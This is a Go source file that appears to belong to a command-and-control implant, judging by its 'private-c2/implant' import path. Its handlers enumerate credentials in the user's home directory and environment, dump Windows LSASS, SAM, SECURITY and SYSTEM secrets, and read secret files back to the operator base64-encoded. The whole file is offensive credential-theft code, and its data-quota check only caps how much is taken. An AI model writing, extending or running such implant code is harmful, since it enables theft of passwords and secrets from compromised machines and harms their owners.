package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/user"
	"strings"

	"github.com/azizbinmohammad/private-c2/implant/modules/credential"
)

// maxCredentialRead bounds a single secret read; larger files must use the
// chunked download path, which enforces the data quota per chunk.
const maxCredentialRead = 4 << 20

func handleCredentialEnum(_ context.Context, _ string) (string, error) {
	username := ""
	if current, err := user.Current(); err == nil {
		username = current.Username
	}
	home, _ := os.UserHomeDir()
	return marshalJSON(credential.Enumerate(username, home, os.Environ()))
}

func handleCredentialDump(_ context.Context, args string) (string, error) {
	kind := strings.TrimSpace(args)
	if kind == "" {
		return "", fmt.Errorf("credential_dump requires lsass, sam, security, or system")
	}
	result, err := credential.Dump(kind)
	if err != nil {
		return "", err
	}
	return marshalJSON(result)
}

func handleCredentialRead(_ context.Context, args string) (string, error) {
	path := strings.TrimSpace(args)
	data, err := credential.ReadSecret(path, maxCredentialRead)
	if err != nil {
		return "", err
	}
	if agentSafety != nil {
		if check := agentSafety.CheckDataQuota(int64(len(data))); !check.Passed {
			return "", fmt.Errorf("credential read refused: %s", check.Reason)
		}
	}
	sum := sha256.Sum256(data)
	return marshalJSON(struct {
		Path   string `json:"path"`
		Size   int    `json:"size"`
		SHA256 string `json:"sha256"`
		Data   string `json:"data"`
	}{
		Path:   path,
		Size:   len(data),
		SHA256: hex.EncodeToString(sum[:]),
		Data:   base64.StdEncoding.EncodeToString(data),
	})
}
